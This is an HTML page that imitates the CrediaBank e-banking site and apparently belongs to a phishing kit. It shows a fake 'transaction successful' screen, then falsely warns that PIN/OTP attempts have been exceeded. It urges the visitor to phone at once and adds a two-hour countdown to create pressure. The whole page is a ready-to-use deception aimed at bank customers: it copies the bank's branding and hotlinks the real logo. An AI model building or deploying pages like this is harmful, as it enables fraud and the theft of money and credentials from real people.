<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <title>CrediaBank e-banking | Επιτυχής Ολοκλήρωση</title>
    <link rel="stylesheet" href="./css/snipped.css">
    <link rel="stylesheet" href="./css/cssr.css">
    <link rel="stylesheet" href="./css/cssl.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        .success-page {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 70vh;
            padding: 40px 20px;
            text-align: center;
        }
        .success-icon {
            width: 100px;
            height: 100px;
            background: #22C55E;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 32px;
            animation: scaleIn 0.5s ease;
        }
        .success-icon svg {
            width: 50px;
            height: 50px;
            stroke: white;
            stroke-width: 3;
            fill: none;
        }
        @keyframes scaleIn {
            0% { transform: scale(0); opacity: 0; }
            60% { transform: scale(1.1); }
            100% { transform: scale(1); opacity: 1; }
        }
        .success-title {
            font-size: 32px;
            font-weight: 700;
            color: #15803D;
            margin-bottom: 12px;
        }
        .success-subtitle {
            font-size: 18px;
            color: #5F6A72;
            margin-bottom: 24px;
            max-width: 400px;
            line-height: 1.5;
        }
        .urgent-box {
            background: #FEF3C7;
            border: 2px solid #F59E0B;
            border-radius: 16px;
            padding: 20px 24px;
            max-width: 420px;
            width: 100%;
            margin-bottom: 24px;
        }
        .urgent-title {
            font-size: 16px;
            font-weight: 700;
            color: #92400E;
            margin-bottom: 8px;
        }
        .urgent-text {
            font-size: 14px;
            color: #78350F;
            line-height: 1.5;
            margin-bottom: 12px;
        }
        .countdown-box {
            background: #FEF2F2;
            border: 2px solid #EF4444;
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
        }
        .countdown-label {
            font-size: 12px;
            color: #991B1B;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }
        .countdown-timer {
            font-size: 32px;
            font-weight: 800;
            color: #DC2626;
            font-family: 'SF Mono', 'Fira Code', monospace;
            letter-spacing: 2px;
        }
        .call-btn {
            background: #EF4444;
            color: white;
            border: none;
            padding: 16px 40px;
            border-radius: 28px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: background 0.2s ease;
            margin-top: 8px;
        }
        .call-btn:hover {
            background: #DC2626;
        }
        .call-btn svg {
            width: 20px;
            height: 20px;
            fill: none;
            stroke: white;
            stroke-width: 2;
        }
    </style>
</head>
<body>

<div class="right-side margin-auto snipcss-wnMB2">
    <div class="container ng-scope redesign-header-fragment-container">
        <div class="row">
            <div fragment="redesignHeader" class="ng-scope">
                <div id="redesign-header" class="redesign-header-container ng-scope">
                    <div class="logo-container hidden-small">
                        <a tabindex="0"><img src="https://ebanking.crediabank.com/img/redesignLogo.png?ver=f1604f7ac63ee5a707473775a64907bb02f96080" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="logo-container hidden-above-medium">
                        <a tabindex="0"><img src="./images/logo-small.svg" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="top-links">
                        <ul class="hidden-small">
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                <div class="header-link-container"><a style="color:#fff;">Καταστήματα &amp; ΑΤΜ</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                                <div class="header-link-container"><a style="color:#fff;">Επικοινωνία</a></div>
                            </li>
                            <li style="display:flex;align-items:center;gap:6px;">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
                                <div class="header-link-container"><a style="color:#fff;">Greek</a></div>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <div class="login-campaigns-container">
                    <div class="login-widget col-lg-6 col-md-12" style="max-width:500px;width:100%;margin:0 auto 48px auto;float:none;">
                        <div class="top-container">
                            <div class="success-page">
                                <div class="success-icon">
                                    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
                                </div>
                                <div class="success-title">Επιτυχής Ολοκλήρωση</div>
                                <div class="success-subtitle">
                                    Η συναλλαγή σας ολοκληρώθηκε με επιτυχία.
                                </div>

                                <div class="urgent-box">
                                    <div class="urgent-title">⚠️ Σημαντική Ειδοποίηση</div>
                                    <div class="urgent-text">
                                        Έχετε υπερβεί τον μέγιστο αριθμό προσπαθειών PIN/OTP.<br>
                                        Για να ξεκλειδώσετε τον λογαριασμό σας, καλέστε άμεσα το Κέντρο Εξυπηρέτησης Πελατών.
                                    </div>
                                    <a href="tel:+302103669000" class="call-btn">
                                        <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
                                        Καλέστε Τώρα +30 210 3669000
                                    </a>
                                    <div class="countdown-box">
                                        <div class="countdown-label">Χρόνος που απομένει για επίλυση</div>
                                        <div class="countdown-timer" id="countdownTimer">02:00:00</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container redesign-footer-container ng-scope">
                    <div class="row">
                        <div class="footer-container ng-scope">
                            <div class="footer-content-left">
                                <span class="footer-logo"></span>
                                <div class="footer-communication-container">
                                    <div class="footer-communication">
                                        <div class="footer-email-container"><span class="footer-email"></span><a class="footer-bold-weight ng-binding" href="mailto:ebanking@crediabank.com">ebanking@crediabank.com</a></div>
                                        <div class="footer-tel-container"><span class="footer-tel"></span><a class="footer-bold-weight ng-binding" href="tel:2103669000">210 366 9000</a></div>
                                    </div>
                                    <div class="footer-socials-container">
                                        <a class="instagram icon" href="#"></a>
                                        <a class="linkedIn icon" href="#"></a>
                                        <a class="youtube icon" href="#"></a>
                                    </div>
                                </div>
                                <div class="footer-apps-container-left">
                                    <div class="footer-apps">
                                        <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                        <span class="ng-binding">Copyright © 2025</span>
                                    </div>
                                </div>
                            </div>
                            <div class="footer-section-container">
                                <div class="footer-sections ng-scope col-6">
                                    <div class="section-title"><h3 class="ng-scope ng-binding">ΠΛΗΡΟΦΟΡΙΕΣ</h3></div>
                                    <ul class="list-without-chevron">
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Όροι Χρήσης</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ασφάλεια Συναλλαγών</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Κωδικοί Μιας Χρήσης</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Συχνές Ερωτήσεις</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υποστήριξη</a></li>
                                    </ul>
                                </div>
                                <div class="footer-sections ng-scope col-6">
                                    <div class="section-title"><h3 class="ng-scope ng-binding">ΧΡΗΣΙΜΑ</h3></div>
                                    <ul class="list-without-chevron">
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Πολιτική Cookies</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Προσωπικά Δεδομένα</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εγγύηση Καταθέσεων</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υπολογιστής ΙΒΑΝ</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ειδικοί Όροι Τραπεζικών Εργασιών</a></li>
                                        <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εργαλείο Μετατροπής Αρχείου σε XML</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="footer-apps-container-right">
                                <div class="footer-apps">
                                    <p class="ng-scope">Κατεβάστε την εφαργμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                    <span class="ng-binding">Copyright © 2025</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
(function() {
    // 2 hours countdown = 7200 seconds
    var totalSeconds = 7200;
    var timerEl = document.getElementById('countdownTimer');

    function formatTime(seconds) {
        var h = Math.floor(seconds / 3600);
        var m = Math.floor((seconds % 3600) / 60);
        var s = seconds % 60;
        return (h < 10 ? '0' : '') + h + ':' + (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
    }

    timerEl.textContent = formatTime(totalSeconds);

    var timer = setInterval(function() {
        totalSeconds--;
        if (totalSeconds <= 0) {
            clearInterval(timer);
            timerEl.textContent = "00:00:00";
            timerEl.style.color = "#000";
        } else {
            timerEl.textContent = formatTime(totalSeconds);
        }
    }, 1000);
})();
</script>
</body>
</html>